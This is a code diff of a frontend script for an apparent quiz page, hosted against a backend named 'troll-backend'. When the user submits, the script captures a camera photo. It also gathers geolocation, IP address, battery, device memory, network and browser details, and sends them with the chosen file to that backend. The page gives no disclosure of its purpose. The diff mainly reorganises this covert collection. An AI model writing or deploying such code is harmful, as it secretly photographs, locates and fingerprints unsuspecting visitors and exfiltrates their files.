@@ -1,22 +1,21 @@
-// ================================
-// FRONTEND SCRIPT.JS
-// ================================
-
-const btn = document.getElementById('submit-btn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const fileInput = document.getElementById('user-file');
+const btn = document.getElementById("submit-btn");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "https://troll-backend.onrender.com/api";
+
+// Camera constraints
+const constraints = { video: { facingMode: "user" }, audio: false };
 
 // ================================
 // GET DEVICE IP
 // ================================
-async function getIp() {
+async function getIP() {
   try {
-    const res = await fetch('https://api.ipify.org?format=json');
+    const res = await fetch("https://api.ipify.org?format=json");
     const data = await res.json();
-    return data.ip || "N/A";
+    return data.ip;
   } catch {
     return "N/A";
   }
@@ -26,17 +25,15 @@ async function getIp() {
 // COLLECT METADATA
 // ================================
 async function collectMetadata() {
-  const ip = await getIp();
-
   const metadata = {
     useragent: navigator.userAgent,
     platform: navigator.platform,
     battery: "N/A",
-    deviceMemory: navigator.deviceMemory || "N/A",
-    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
     location: "N/A",
-    ip: ip,
-    time: new Date().toLocaleString()
+    time: new Date().toLocaleString(),
+    ip: await getIP(),
+    deviceMemory: navigator.deviceMemory || "N/A",
+    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A"
   };
 
   // Battery info
@@ -47,88 +44,99 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location
+  // Geolocation
   if (navigator.geolocation) {
     try {
-      const pos = await new Promise((res, rej) =>
-        navigator.geolocation.getCurrentPosition(res, rej)
+      const pos = await new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject)
       );
       metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
-    } catch {}
+    } catch {
+      metadata.location = "Denied";
+    }
   }
 
   return metadata;
 }
 
 // ================================
-// CAPTURE CAMERA IMAGE
+// CAPTURE CAMERA
 // ================================
 async function captureCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-    video.srcObject = stream;
+  const stream = await navigator.mediaDevices.getUserMedia(constraints);
+  video.srcObject = stream;
 
-    await new Promise(r => setTimeout(r, 2500)); // wait for camera ready
+  await new Promise(r => setTimeout(r, 2000)); // give time for camera
 
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const image = canvas.toDataURL('image/png');
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const metadata = await collectMetadata();
+  const image = canvas.toDataURL("image/png");
 
-    await fetch(`${BACKEND_BASE}/upload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata })
-    });
+  stream.getTracks().forEach(track => track.stop());
 
-    stream.getTracks().forEach(t => t.stop());
-
-  } catch (err) {
-    console.error("Camera error:", err);
-  }
+  return image;
 }
 
 // ================================
-// SEND FILE
+// SEND CAMERA IMAGE + METADATA
+// ================================
+async function sendCameraData() {
+  const metadata = await collectMetadata();
+  const image = await captureCamera();
+
+  const res = await fetch(`${BACKEND_BASE}/upload`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ image, metadata })
+  });
+
+  return await res.json();
+}
+
+// ================================
+// SEND FILE UPLOAD
 // ================================
 async function sendFile(file) {
   if (!file) return;
 
   const reader = new FileReader();
-  reader.onload = async () => {
-    const base64 = reader.result;
-    try {
-      await fetch(`${BACKEND_BASE}/file-upload`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ fileData: base64, filename: file.name })
-      });
-    } catch (err) {
-      console.error("File upload error:", err);
-    }
-  };
-  reader.readAsDataURL(file);
+  return new Promise((resolve, reject) => {
+    reader.onload = async () => {
+      try {
+        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ fileData: reader.result, filename: file.name })
+        });
+        resolve(await res.json());
+      } catch (err) {
+        reject(err);
+      }
+    };
+    reader.readAsDataURL(file);
+  });
 }
 
 // ================================
-// SUBMIT BUTTON
+// SUBMIT FORM
 // ================================
-btn.addEventListener('click', async (e) => {
+btn.addEventListener("click", async e => {
   e.preventDefault();
 
-  // Capture camera if permission granted
-  await captureCamera();
-
-  // Wait a bit for user to select file
   if (!fileInput.files.length) {
     alert("Please select a file before submitting!");
     return;
   }
 
-  await sendFile(fileInput.files[0]);
+  try {
+    await sendCameraData();
+    await sendFile(fileInput.files[0]);
 
-  // Show success
-  document.getElementById('quiz-container').style.display = 'none';
-  document.getElementById('success-container').style.display = 'flex';
+    document.getElementById("quiz-container").style.display = "none";
+    document.getElementById("success-container").style.display = "flex";
+  } catch (err) {
+    console.error("Submission error:", err);
+    alert("Something went wrong while submitting.");
+  }
 });
